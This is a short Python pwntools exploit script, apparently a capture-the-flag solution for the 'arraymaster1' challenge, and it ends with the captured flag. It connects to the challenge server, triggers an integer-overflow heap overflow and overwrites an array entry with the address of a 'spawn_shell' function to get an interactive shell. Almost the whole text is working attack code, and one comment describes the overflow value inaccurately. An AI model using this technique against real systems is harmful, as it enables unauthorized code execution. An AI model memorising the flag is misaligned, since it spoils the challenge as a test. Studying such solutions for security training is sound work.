from pwn import *

exe = ELF("arraymaster1")
context.binary = exe
HOST = "arraymaster.challs.cyberchallenge.it"
PORT = 6005
p = remote(HOST, PORT)
shell = 0x4009c3  # Address of function "spawn_shell"

p.sendlineafter("> ", "init A 64 2305843009213693953")  # maximum number contained in an int
p.sendlineafter("> ", "init B 8 256")  # random number to after trigger the vulnerability
p.sendlineafter("> ", "set A 7 " + str(int(shell)))  # convert the address into integer
p.sendlineafter("> ", "get B 0")  # Trigger the heap overflow
p.interactive()

# FLAG --> CCIT{arraymaster1 from 35c3 Junior CTF - kx7Fm7nYS4wtPFJ4}
